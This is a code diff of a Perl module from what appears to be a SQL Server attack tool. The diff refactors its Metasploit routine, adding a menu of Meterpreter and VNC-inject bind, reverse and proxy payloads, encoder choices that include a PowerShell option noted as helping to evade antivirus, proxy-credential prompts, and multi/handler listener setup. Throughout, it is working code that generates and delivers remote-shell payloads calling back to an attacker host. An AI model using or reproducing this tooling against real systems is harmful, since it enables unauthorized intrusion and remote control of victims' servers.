@@ -26,66 +26,45 @@ our $conf;
 # And kudos to the whole Metasploit team
 sub metasploit
 {
+	# Available payloads 
+	my @payloads = (
+	      "meterpreter/bind_tcp",
+	      "meterpreter/reverse_http",
+	      "meterpreter/reverse_https",
+	      "meterpreter/reverse_https_proxy",
+	      "meterpreter/reverse_tcp",
+	      "vncinject/bind_tcp",
+	      "vncinject/reverse_http",
+	      "vncinject/reverse_tcp",
+	      "x64/meterpreter/bind_tcp",
+	      "x64/meterpreter/reverse_https",
+	      "x64/meterpreter/reverse_tcp",
+	      "x64/vncinject/bind_tcp",
+	      "x64/vncinject/reverse_https",
+	      "x64/vncinject/reverse_tcp",
+	);
+	my $stagerformat = "";
+	# payload parameters
+	my $exitfunc;
+	my $lport;
+	my $rhost;
+	my $lhost;
+	my $proxyhost;
+	my $proxyport;
+	my $proxypassword;
+	my $proxytype;
+	my $proxyusername;
 	print "[+] Entering Metasploit module. In order to use this module ".
-	   "you need to\n    have found an available TCP port, either ".
-	   "inbound or outbound\n";
+	   "you need to\n    have found an available TCP port (either ".
+	   "inbound or outbound) or an outbound\n    proxy (either SOCKS or HTTP)\n";
 	# We start checking whether Metasploit is there...
 	print "[+] Checking Metasploit3 availability....\n";
-	my $msfcli = "";
-	my $msfconsole = "";
-	my $msfpayload = "";
-	my $msfencode = "";
-	my $msfclient = "";
-	if ($conf->{'msfpath'} eq "") {
-		my $path1 = $ENV{PATH};
-		my @path = split(/:/,$path1);
-		foreach (@path) {
-			if (-e $_."/msfcli") {
-				$msfcli = $_."/msfcli";
-			} elsif (-e $_."/msfcli3") {
-				$msfcli = $_."/msfcli3";
-			}
-			if (-e $_."/msfpayload") {
-				$msfpayload = $_."/msfpayload";
-			} elsif (-e $_."/msfpayload3") {
-				$msfpayload = $_."/msfpayload3";
-			}
-			if (-e $_."/msfencode") {
-				$msfencode = $_."/msfencode";
-			} elsif (-e $_."/msfencode3") {
-				$msfencode = $_."/mfsencode3";
-			}
-			if (-e $_."/msfconsole") {
-				$msfconsole = $_."/msfconsole";
-			} elsif (-e $_."/msfconsole3") {
-				$msfconsole = $_."/msfconsole3";
-			}	
-		}
-	} else {
-		if ($conf->{'msfpath'} != m/\/$/) { # add a final slash, if needed
-			$conf->{'msfpath'} .= "/";
-		}
-		if (-e $conf->{'msfpath'}."msfcli") {
-			$msfcli = $conf->{'msfpath'}."msfcli";
-		} elsif (-e $conf->{'msfpath'}."msfcli3") {
-			$msfcli = $conf->{'msfpath'}."msfcli3";
-		}
-		if (-e $conf->{'msfpath'}."msfpayload") {
-			$msfpayload = $conf->{'msfpath'}."msfpayload";
-		} elsif (-e $conf->{'msfpath'}."msfpayload3") {
-			$msfpayload = $conf->{'msfpath'}."msfpayload3";
-		}
-		if (-e $conf->{'msfpath'}."msfencode") {
-			$msfencode = $conf->{'msfpath'}."msfencode";
-		} elsif (-e $conf->{'msfpath'}."msfencode3") {
-			$msfencode = $conf->{'msfpath'}."msfencode3";
-		}
-		if (-e $conf->{'msfpath'}."msfconsole") {
-			$msfconsole = $conf->{'msfpath'}."msfconsole";
-		} elsif (-e $conf->{'msfpath'}."msfconsole3") {
-			$msfconsole = $conf->{'msfpath'}."msfconsole3";
-		}
-	}
+	# msf executables
+	my $msfcli = findmsffile("msfcli");
+	my $msfconsole = findmsffile("msfconsole");
+	my $msfpayload = findmsffile("msfpayload");
+	my $msfencode = findmsffile("msfencode");
+	my $msfclient = findmsffile("msfclient");
 	if (($conf->{'msfclient'} eq "msfcli") and ($msfcli eq "")) {
 		print "[-] msfcli not found\n";
 		exit(-1);
@@ -102,64 +81,22 @@ sub metasploit
 		print "[-] msfencode not found\n";
 		exit(-1);
 	}
-	my $fileformat = "";
-	print "[+] Which file format you want to use?\n";
-	print "    1: Powershell (helps evading AV)\n    2: PE executable (works on older servers)\n";
-	while (($fileformat !=1) and ($fileformat != 2)) {
+	
+	print "[+] Choose Payload\n";
+	for (my $i = 0; $i < scalar(@payloads); $i++) {
+	      print "   ".$i.": ".$payloads[$i]."\n";
+	}
+	my $item = -1;
+	while (($item < 0) or ($item >= scalar(@payloads))) {
 		print "> ";
-		$fileformat = <STDIN>;
-		chomp($fileformat);
+		$item = <STDIN>;
 	}
-	if ($fileformat == 1) {
-		$fileformat = ".ps1";
-	} else {
-		$fileformat = ".exe";
-	}
-	print "[+] Which payload you want to use?\n";
-	print "    1: Meterpreter\n    2: VNC\n";
-	my $payload;
-	while (($payload != 1) and ($payload != 2)) {
-		print "> ";
-		$payload = <STDIN>;
-		chomp($payload);
-	}
-	if ($payload == 1) {
-		$payload = "meterpreter";
-	} else {
-		$payload = "vncinject";
-	}
-	print "[+] Which type of connection you want to use?\n";
-	print "    1: bind_tcp\n    2: reverse_tcp\n";
-	my $conn;
-	while (($conn ne "1") and ($conn ne "2")) {
-		print "> ";
-		$conn = <STDIN>;
-		chomp($conn);
-	}
-	if ($conn == 1) {
-		$conn = "bind_tcp";
-	} else {
-		$conn = "reverse_tcp";
-	}
-	my $host2;
-	if ($conn eq "bind_tcp") {
-		print "[+] Enter remote host [".$conf->{'host'}."]\n> ";
-		$host2 = <STDIN>;
-		chomp $host2;
-		if ($host2 eq "") {
-			$host2 = $conf->{'host'};
-		}
-	}
-	if ($conn eq "bind_tcp") {
-		print "[+] Enter remote port number\n";
-	} else {
-		print "[+] Enter local port number\n";
-	}
-	my $port = 0;
-	while (($port < 1) or ($port > 65535)) {
-		print "> ";
-		$port = <STDIN>;
-		chomp($port);
+	my $payload = $payloads[$item]; # Payload to use
+	
+	my ($fileformat, $rhost, $port) = readmsfparams($payload);
+	
+	if ($payload =~ /proxy/) {
+		($proxyhost, $proxyport, $proxytype, $proxyusername, $proxypassword) = readmsfproxy();
 	}
 
 	# ok... let's start the fun
@@ -167,23 +104,34 @@ sub metasploit
 	# We use a random name, because using the same name twice would
 	# create problems if the first executable is still running
 	my $stager = "met".int(rand()*65535).$fileformat;
-	my $command = $msfpayload." windows/".$payload."/".$conn.
-		" exitfunc=process lport=".$port." ";
-	if ($conn ne "bind_tcp") {
-		$command .= " lhost=".$conf->{'lhost'}." ";
+	
+	my $command = $msfpayload." windows/".$payload. " exitfunc=process lport=".$port." ";
+
+	if ($payload =~ /reverse/) {
+		$command .= "lhost=".$conf->{'lhost'}." ";
 	}
+	
+	if ($payload =~ /proxy/) {
+		$command .= "proxyhost=".$proxyhost." ".
+			    "proxyport=".$proxyport." ".
+			    "proxy_type=".$proxytype." ".
+			    "proxy_username=".$proxyusername." ".
+			    "proxy_password=".$proxypassword." ";
+	}
+
 	my $stagertype;
 	if ($fileformat eq ".exe") {
 		$stagertype = "exe";
 	} else {
 		$stagertype = "psh";
 	}
-	# Now, it seems that you need msfencoder to use Powershell...
-	if (($conf->{'msfencoder'} eq "") and ($fileformat eq ".exe")) {
+	if (($conf->{'msfencoder'} eq "") and ($fileformat eq ".exe")) { # No encoder
 		$command .= " X > /tmp/".$stager;
 	} else {
-		if ($conf->{'msfencoder'} eq "") {
-			$conf->{'msfencoder'} = "x86/shikata_ga_nai";
+		if ($payload =~ /x64/) {
+			  $conf->{'msfencoder'} = "x64/xor";
+		} elsif ($conf->{'msfencoder'} eq "") {
+			  $conf->{'msfencoder'} = "x86/shikata_ga_nai";
 		}
 		$command .= " R | ".$msfencode.
 			    " -e ".$conf->{'msfencoder'}.
@@ -227,7 +175,7 @@ sub metasploit
 	# who starts the connection
 	my $delayclient = 0;
 	my $delayserver = 0;
-	if ($conn eq "bind_tcp") {
+	if ($payload =~ /bind_tcp/) {
 		$delayclient = 3;
 	} else {
 		$delayserver = $conf->{'msfserverdelay'}; # msfconsole can take a while to start
@@ -260,9 +208,9 @@ sub metasploit
 		sleep($delayclient);
 	}
 	if ($conf->{'msfclient'} eq "msfcli") {
-		runmsfcli($msfcli, $payload, $conn, $port, $host2);
+		runmsfcli($msfcli, $payload, $port, $rhost);
 	} else {
-		runmsfconsole($msfconsole, $payload, $conn, $port, $host2);
+		runmsfconsole($msfconsole, $payload, $port, $rhost);
 	}
 	exit(0);
 }
@@ -271,12 +219,11 @@ sub runmsfcli
 {
 	my $msfcli = $_[0];
 	my $payload = $_[1];
-	my $conn = $_[2];
-	my $port = $_[3];
-	my $host2 = $_[4];
+	my $port = $_[2];
+	my $host2 = $_[3];
 	my $syscommand = $msfcli." multi/handler ".
-	              "payload=windows/".$payload."/".$conn." ";
-	if ($conn eq "bind_tcp") {
+	              "payload=windows/".$payload." ";
+	if ($payload =~ /bind_tcp/) {
 		$syscommand .= "lport=".$port." rhost=".$host2." E";
 	} else {
 		$syscommand .= "lport=".$port." lhost=".$conf->{'lhost'}." E";
@@ -292,9 +239,8 @@ sub runmsfconsole
 {
 	my $msfconsole = $_[0];
 	my $payload = $_[1];
-	my $conn = $_[2];
-	my $port = $_[3];
- 	my $host2 = $_[4];
+	my $port = $_[2];
+ 	my $host2 = $_[3];
 	# create the script
 	my $rcscript = -1;
 	while ($rcscript == -1) {
@@ -305,9 +251,9 @@ sub runmsfconsole
 	}
 	open (OUT, ">".$rcscript);
 	print OUT "use exploit/multi/handler\n";
-	print OUT "set payload windows/".$payload."/".$conn."\n";
+	print OUT "set payload windows/".$payload."\n";
 	print OUT "set lport ".$port."\n";
-	if ($conn eq "bind_tcp") {
+	if ($payload =~ /bind_tcp/) {
 		print OUT "set rhost ".$host2."\n";
 	} else {
 		print OUT "set lhost ".$conf->{'lhost'}."\n";
@@ -384,6 +330,109 @@ sub handledep
 	 sendrequest($cmd);
 	# God bless xp_regread and xp_regwrite... 
 	# Two authentic backdoors by design
+}
+
+sub findmsffile
+{
+	my $file = $_[0];
+	if ($conf->{'msfpath'} eq "") {
+		my $path1 = $ENV{PATH};
+		my @path = split(/:/,$path1);
+		foreach (@path) {
+			if (-e $_.$file) {
+				return $_.$file;
+			} elsif (-e $_.$file."3") {
+				return $_.$file."3";
+			}
+		}
+	} else {
+		if ($conf->{'msfpath'} != m/\/$/) { # add a final slash, if needed
+			$conf->{'msfpath'} .= "/";
+		}
+		if (-e $conf->{'msfpath'}.$file) {
+			return $conf->{'msfpath'}.$file;
+		} elsif (-e $conf->{'msfpath'}.$file."3") {
+			return $conf->{'msfpath'}.$file."3";
+		}
+	}
+	return "";
+}
+
+sub readmsfparams
+{
+	my $payload = $_[0];
+	my $fileformat;
+	my $rhost;
+	my $port;
+	print "[+] Which file format you want to use?\n";
+	print "    1: Powershell (helps evading AV)\n    2: PE executable (works on older servers)\n";
+	while (($fileformat !=1) and ($fileformat != 2)) {
+		print "> ";
+		$fileformat = <STDIN>;
+		chomp($fileformat);
+	}
+	if ($fileformat == 1) {
+		$fileformat = ".ps1";
+	} else {
+		$fileformat = ".exe";
+	}
+	if ($payload =~ /bind_tcp/) {
+		print "[+] Enter remote host [".$conf->{'host'}."]\n> ";
+		$rhost = <STDIN>;
+		chomp $rhost;
+		if ($rhost eq "") {
+			$rhost = $conf->{'host'};
+		}
+	} else {
+		$rhost = "";
+	}
+	print "[+] Enter listening port number\n";
+	while (($port < 1) or ($port > 65535)) {
+		print "> ";
+		$port = <STDIN>;
+		chomp($port);
+	}
+	return ($fileformat, $rhost, $port);
+}
+
+sub readmsfproxy
+{	
+	my $phost;
+	my $pport;
+	my $ptype;
+	my $puser;
+	my $ppwd;
+	print "[+] Enter proxy host";
+	while ($phost eq "") {
+		print "\n> ";
+		$phost = <STDIN>;
+		chomp($phost);    
+	}
+	print "[+] Enter proxy port";
+	while (($pport < 1) or ($pport > 65535)) {
+		print "\n> ";
+		$pport = <STDIN>;
+		chomp($pport);
+	}
+	print "[+] Enter proxy type";
+	print "    1: HTTP    2: SOCKS\n>";
+	while (($ptype < 1) or ($ptype > 2)) {
+		print "\n> ";
+		$ptype = <STDIN>;
+		chomp($ptype);
+	}
+	if ($ptype eq "1") {
+		$ptype = "http";
+	} else {
+		$ptype = "socks";
+	}
+	print "[+] Enter proxy username\n>";
+	$puser = <STDIN>;
+	chomp($puser);
+	print "[+] Enter proxy password\n>";
+	$ppwd = <STDIN>;
+	chomp($ppwd);
+	return ($phost, $pport, $ptype, $puser, $ppwd);
 }
 
 1;
